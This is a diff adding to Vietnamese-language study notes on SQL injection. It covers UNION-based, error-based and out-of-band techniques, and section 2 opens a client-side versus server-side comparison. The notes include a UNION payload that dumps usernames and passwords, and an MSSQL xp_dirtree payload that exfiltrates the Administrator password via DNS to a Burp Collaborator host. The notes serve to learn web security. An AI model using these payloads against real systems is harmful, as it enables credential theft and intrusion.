@@ -11,14 +11,22 @@
 - Thường được dùng để hợp các kết quả từ nhiều bảng lại với nhau.
 - Dùng `UNION SELECT...` để gắn thêm 1 bảng mà mình muốn vào kết quả của truy vấn gốc, với điều kiện là số lượng cột phải bằng nhau.
 - Ví dụ: Có truy vấn gốc `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
+
   Với việc nhập vào phần `category` thì em muốn lấy tất cả các tài khoản mật khẩu từ trang đó, thì em chèn thêm là `' UNION SELECT username, password FROM users--`
+
   Khi đó truy vấn được gửi đi sẽ là `SELECT * FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users`, có nghĩa là ngoài việc lấy tất cả các sản phầm trong danh mục `Gifts` thì nó còn lấy thêm cả `username` AND `password`.
 
 ### 1.3. Error-Based SQLi:
-
+- Được dùng khi mà gửi đi 1 truy vấn và server, database trả về với 1 thông báo lỗi, từ thông báo này có thể thu thập được các thông tin như cấu trúc bảo, tên cột,... Rồi từ mấy cái lỗi đấy, kẻ tấn cộng lợi dụng nó để lấy được thông tin mà họ muốn.
 
 ### 1.4. Out-of-band SQLi (OAST):
+- Là kỹ thuật mà dùng để chèn một truy vấn độc hại vào SQL, khiến server gửi một request HTTP hoặc DNS đến một địa chỉ do kẻ tấn công kiểm soát.
 
+- Ví dụ: Giả sử có truy vấn này `'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`
+
+  Thì nó đã lấy pass của `Admintrator` xong gán vào đầu của url `.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a`. Ví dụ pass là `admin1234` thì cái URL được server gửi request đi sẽ là `admin1234.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a`.
+
+  Kẻ tấn công sẽ theo dõi các request được gửi đến, và họ có thể thấy được password của người dùng `Admintartor` là `admin1234`.
 
 # 2. Phân biệt Client Side với Server Side
 - Server là 1 cái máy chủ có thể tương tác với database, thực hiện chức năng lấy dữ liệu cần thiết gửi về cho client.
